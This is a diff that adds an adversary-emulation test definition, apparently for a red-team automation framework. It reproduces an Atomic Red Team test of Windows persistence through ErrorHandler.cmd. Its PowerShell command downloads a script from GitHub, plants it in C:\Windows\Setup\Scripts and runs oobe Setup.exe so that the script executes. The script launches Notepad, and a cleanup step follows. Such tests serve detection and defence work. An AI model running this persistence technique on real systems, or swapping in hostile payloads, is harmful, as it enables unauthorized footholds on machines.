@@ -1,0 +1,28 @@
+---
+- id: 1a2b3fe2288143e8b07daf1fc47f24f6
+  name: Persistence via ErrorHandler.cmd script execution
+  description: 'Create persistence by triggering script within ErrorHandler.cmd upon
+    the execution of specific binaries within the oobe directory.
+
+    Upon test execution, Setup.exe will be executed to further execute script within
+    ErrorHandlercmd to launch Notepad.
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1546
+    name: Event Triggered Execution
+  platforms:
+    windows:
+      psh:
+        command: if (Test-Path PathToAtomicsFolder\T1546\src\ErrorHandler.cmd) { ;
+          } else {New-Item -Type Directory "PathToAtomicsFolder\T1546\src\" -ErrorAction
+          ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/src/ErrorHandler.cmd"
+          -OutFile "PathToAtomicsFolder\T1546\src\ErrorHandler.cmd"};  Copy-Item -Path
+          PathToAtomicsFolder\T1546\src\ErrorHandler.cmd -Destination C:\Windows\Setup\Scripts\ErrorHandler.cmd;
+          C:\windows\System32\oobe\Setup
+        payloads: []
+        cleanup: Remove-Item C:\Windows\Setup\Scripts\ErrorHandler.cmd
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
